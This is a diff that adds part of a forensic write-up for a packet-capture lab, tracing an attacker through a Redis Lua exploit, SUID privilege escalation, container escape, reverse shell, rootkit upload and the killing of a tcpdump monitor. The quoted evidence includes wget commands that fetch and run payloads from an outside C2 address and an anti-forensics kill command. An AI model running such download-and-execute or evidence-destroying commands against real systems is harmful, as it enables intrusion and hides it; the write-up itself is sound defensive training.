@@ -271,3 +271,343 @@ Redis server v=5.0.7
 ![alt text](screenshots/032-redishell-pcap-analysis-cyberdefenders-image-15.png)
 
 **Answer:** `redis-db.corp.local, 5.0.7`
+
+## Privilege Escalation
+
+### Q13 - After gaining user-level access to the second container, the attacker uploaded a custom exploit file targeting a vulnerability in the container's data storage service. What file did the attacker upload for privilege escalation on the second system?
+
+I isolated the Telnet communication to the second compromised system and followed the TCP stream.
+
+![alt text](screenshots/032-redishell-pcap-analysis-cyberdefenders-image-16.png)
+
+
+Inside the stream, the attacker downloads a custom Lua exploit from the C2 server:
+
+```text id="k8ot0h"
+wget http://185.220.101.50:2345/exploit.lua
+```
+
+Right after that, the attacker makes it executable:
+
+```text id="ucobfm"
+chmod +x /exploit.lua
+```
+
+Then it is executed through Redis:
+
+```text id="s343ju"
+redis-cli -h 127.0.0.1 --eval exploit.lua
+```
+
+![alt text](screenshots/032-redishell-pcap-analysis-cyberdefenders-image-17.png)
+
+
+
+**Answer:** `exploit.lua`
+
+### Q14 - What is the full path of the SUID binary exploited for privilege escalation?
+
+I switched back to viewing the communication in both directions, instead of only one side of the Telnet stream.
+
+Then I used Find with:
+
+```text
+exploit.lua
+```
+
+![alt text](screenshots/032-redishell-pcap-analysis-cyberdefenders-image-18.png)
+
+That brought me back to the part where the attacker downloads and runs the Lua exploit.
+
+Right after the exploit execution, the attacker searches for the Redis-related SUID binary:
+
+```text
+SUID=$(find / -perm -4000 2>/dev/null | grep redis-backup)
+```
+
+The output then shows:
+
+```text
+[+] Found: /usr/local/bin/redis-backup
+```
+
+**Answer:** `/usr/local/bin/redis-backup`
+
+### Q15 - What was the first command the attacker executed after privilege escalation?
+
+After the SUID binary was found and executed, the prompt changed to root:
+
+```text
+root@redis-db
+```
+
+Immediately after privilege escalation, the attacker ran:
+
+```text
+whoami
+```
+
+The output confirms root access:
+
+```text
+root
+```
+
+![alt text](screenshots/032-redishell-pcap-analysis-cyberdefenders-image-19.png)
+
+**Answer:** `whoami`
+
+### Q16 - The Lua exploit file uploaded by the attacker targets a specific vulnerability in the Redis scripting subsystem. What CVE number is associated with the Redis Lua subsystem vulnerability used for privilege escalation?
+
+I searched externally because the PCAP gave me the practical exploit evidence, but not the CVE number directly.
+
+From the Telnet stream, I already had the key artifacts:
+
+```text
+wget http://185.220.101.50:2345/exploit.lua
+```
+
+```text
+redis-cli -h 127.0.0.1 --eval exploit.lua
+```
+
+So the exploit was clearly tied to Redis and Lua scripting.
+
+Then I searched for:
+
+```text
+CVE redis scripting exploit redis-backup
+```
+
+![alt text](screenshots/032-redishell-pcap-analysis-cyberdefenders-image-20.png)
+
+Before submitting the answer, I read the Redis advisory instead of relying only on the search result title.
+
+The advisory describes `CVE-2025-49844` as a Redis Lua use-after-free vulnerability where an authenticated user can use a specially crafted Lua script and potentially reach remote code execution. ([redis.io][1])
+
+That matches the lab context well enough: the attacker had Redis access, uploaded `exploit.lua`, and executed it through `redis-cli`.
+
+[1]: https://redis.io/blog/security-advisory-cve-2025-49844/?utm_source=chatgpt.com "Security Advisory: CVE-2025-49844"
+
+
+**Answer:** `CVE-2025-49844`
+
+## Defense Evasion - Container Escape
+
+### Q17 - With root access inside the container, the attacker's next objective was escaping to the underlying host system. What is the name of the script executed to escape from the container to the host system?
+
+I stayed in the same Telnet stream after the attacker became root on the second container.
+
+After moving into `/root`, the attacker downloaded another script from the C2 server:
+
+```text id="m856um"
+wget http://185.220.101.50:2345/escape.sh
+```
+
+Then the script was made executable and launched:
+
+```text id="qgw69a"
+chmod +x escape.sh
+./escape.sh
+```
+
+This already points to `escape.sh` as the container escape script.
+
+![alt text](screenshots/032-redishell-pcap-analysis-cyberdefenders-image-21.png)
+
+We can confirm it even more directly because the script output literally says that the escape was successful:
+
+```text id="h3xhdp"
+nsenter escape successful
+```
+
+**Answer:** `escape.sh`
+
+### Q18 - The container escape script established a new reverse shell connection to the attacker's C2 infrastructure. What port was used for the reverse shell connection after escaping the container?
+
+After the script reports the container escape, it prints the checks to perform:
+
+```text
+Reverse shell on 185.220.101.50:5555
+```
+
+![alt text](screenshots/032-redishell-pcap-analysis-cyberdefenders-image-22.png)
+
+**Answer:** `5555`
+
+### Q19 - What CVE number is associated with the container escape vulnerability?
+
+I searched externally because the PCAP showed the escape behavior, but not the CVE number directly.
+
+From the script output, I already had the relevant container escape artifacts:
+
+```text
+Host path: /var/lib/docker/overlay2/...
+```
+
+```text
+Attempting Method 3: nsenter to host namespace
+nsenter escape successful
+```
+
+```text
+[NSENTER] Escaped to host!
+```
+
+Then I searched using the container escape context and the Docker overlay path:
+
+```text
+CVE var/lib/docker/overlay2/ escape.sh
+```
+
+![alt text](screenshots/032-redishell-pcap-analysis-cyberdefenders-image-23.png)
+
+That brought me to `CVE-2022-0492`, described as a Linux container escape vulnerability.
+
+This matches the lab context because the attacker executed `escape.sh`, escaped from the Redis container to the host, and then established a new reverse shell after the escape.
+
+**Answer:** `CVE-2022-0492`
+
+## Persistence & Impact
+
+### Q20 - After successfully escaping to the host system, the attacker created a file to document their access. What is the full path of the proof-of-compromise file created by the attacker on the host system?
+
+
+After the script completes, it tells what to check for:
+
+```text
+Proof file on host: /tmp/you_have_been_hacked.txt
+```
+
+![alt text](screenshots/032-redishell-pcap-analysis-cyberdefenders-image-24.png)
+
+**Answer:** `/tmp/you_have_been_hacked.txt`
+
+### Q21 - To facilitate uploading additional tools to the compromised host, the attacker installed a Python-based HTTP server that supports file uploads. What server did the attacker install on the host system?
+I stayed on the post-escape reverse shell traffic and searched for the upload server directly:
+
+```text id="83a89v"
+ip.addr == 185.220.101.50 && tcp.port == 5555 && frame contains "uploadserver"
+```
+
+![alt text](screenshots/032-redishell-pcap-analysis-cyberdefenders-image-25.png)
+
+That brought me to the relevant command/output.
+
+The attacker installed the Python upload server with:
+
+```text id="azs8ck"
+pip install uploadserver
+```
+
+The output also confirms it:
+
+```text id="ajyqcu"
+Successfully installed uploadserver-5.2.2
+```
+
+So the server installed on the host system was:
+
+```text id="8hqif5"
+uploadserver
+```
+
+![alt text](screenshots/032-redishell-pcap-analysis-cyberdefenders-image-26.png)
+
+**Answer:** `uploadserver`
+
+### Q22 - Using the upload server, the attacker transferred files necessary for installing a kernel-level rootkit, which would provide persistent, stealthy access to the compromised host. What files did the attacker upload to the host system for rootkit installation? (List all files, comma-separated)
+
+For Q22, the answer is visible in the `uploadserver` logs.
+
+After the attacker started the upload server, the log shows files being uploaded into `/root/file/`.
+
+![alt text](screenshots/032-redishell-pcap-analysis-cyberdefenders-image-27.png)
+
+The relevant uploaded rootkit files are:
+
+```text
+kernel-rootkit.c
+```
+
+```text
+Makefile
+```
+
+```text
+install-rootkit.sh
+```
+
+The `employee_data.csv` file appears in the same upload server traffic, but it is not part of the rootkit installation files.
+
+**Answer:** `kernel-rootkit.c, Makefile, install-rootkit.sh`
+
+>[!NOTE]
+>
+>![alt text](screenshots/032-redishell-pcap-analysis-cyberdefenders-image-28.png)
+>
+>We can also notice that a lot of the story was basically visible just by filtering HTTP:
+>
+>```text
+>http
+>```
+>
+>In that view, the main phases are already summarized in front of us:
+>
+>```text
+>POST /script
+>GET /ubuntu/...
+>GET /
+>GET /employee_data.csv
+>```
+>
+>So yes, in a small lab dataset like this, a simple HTTP filter already gives a rough timeline of what happened.
+>
+>The first Jenkins exploitation is visible through the `/script` requests.
+>
+>The package installation phase is visible through the Ubuntu package downloads.
+>
+>The later file-transfer activity is visible through the HTTP server requests and uploaded/downloaded files.
+>
+>But this is also why it is important not to stop at “I saw the file name”.
+>
+>Investigation is not only about finding **what** appeared in the traffic.
+>
+>It is about understanding **how** the attacker moved from one phase to the next:
+>
+>```text
+>Jenkins exploitation
+>→ reverse shell
+>→ linpeas.sh
+>→ credentials.txt
+>→ Telnet to second host
+>→ Redis exploit.lua
+>→ SUID privilege escalation
+>→ escape.sh
+>→ host reverse shell
+>→ uploadserver
+>→ rootkit files
+>```
+>
+>So the HTTP filter gives a useful high-level summary.
+>
+>The actual analysis comes from following the right streams and understanding why each artifact appears there.
+
+## Defense Evasion - Anti-Forensics
+
+### Q23 - Before concluding their session, the attacker discovered that network traffic was being captured and took action to terminate the monitoring process. What is the full command executed by the attacker to terminate the network packet capture process?
+
+In the post-escape host shell, the attacker checked the running processes and searched for `tcpdump`.
+
+The output showed the packet capture process writing to:
+
+```text
+/tmp/monitor.pcap
+```
+![alt text](screenshots/032-redishell-pcap-analysis-cyberdefenders-image-29.png)
+
+The relevant process had PID `24918`.
+
+After identifying it, the attacker terminated the capture process.
+
+**Answer:** `kill -9 24918`
